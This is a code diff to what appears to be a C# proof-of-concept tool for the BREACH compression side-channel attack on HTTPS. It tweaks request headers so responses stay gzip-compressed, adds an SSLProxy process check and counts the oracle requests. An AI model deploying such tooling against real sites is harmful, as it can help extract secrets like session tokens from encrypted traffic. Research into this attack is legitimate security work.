@@ -30,9 +30,8 @@ namespace BREACHBasic
                 }
             }
 
-
-            Process[] pname = Process.GetProcessesByName("SSLProxy");
-            if (pname.Length == 0)
+            if (Process.GetProcessesByName("SSLProxy").Length == 0
+                && Process.GetProcessesByName("SSLProxy.vshost").Length == 0)
             {
                 WriteConsoleWarning("## WARNING ## SSLProxy.exe not detected");
                 WriteConsoleInfo("> Please run SSLProxy first");
@@ -60,16 +59,14 @@ namespace BREACHBasic
                 return null;
             }
 
-            webRequest.Timeout = 20 * 1000;
+            webRequest.Timeout = 15 * 1000;
             webRequest.Headers["Cache-Control"] = "no-cache";
-            webRequest.Headers["Accept-Encoding"] = "gzip,deflate,sdch";
+            webRequest.Headers["Accept-Encoding"] = "gzip,deflate";
             webRequest.Headers["Pragma"] = "no-cache";
 
             ((HttpWebRequest)webRequest).Accept = "*/*";
-            ((HttpWebRequest)webRequest).UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4";
-            ((HttpWebRequest)webRequest).KeepAlive = false;
-            ((HttpWebRequest)webRequest).AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
-            ((HttpWebRequest)webRequest).ProtocolVersion = HttpVersion.Version11;
+            ((HttpWebRequest)webRequest).UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (BREACH 1.0, like Gecko) Chrome/22.0.1229.94 Safari/537.4";
+            ((HttpWebRequest)webRequest).KeepAlive = true;
 
             try
             {
@@ -82,9 +79,8 @@ namespace BREACHBasic
                             NumberOfRequests++;
 
                             // We don't actually need to see the result, so just return null
-                            string result = sr.ReadToEnd();
+                            sr.ReadToEnd();
                             sr.Close();
-
                             return null;
                         }
                     }
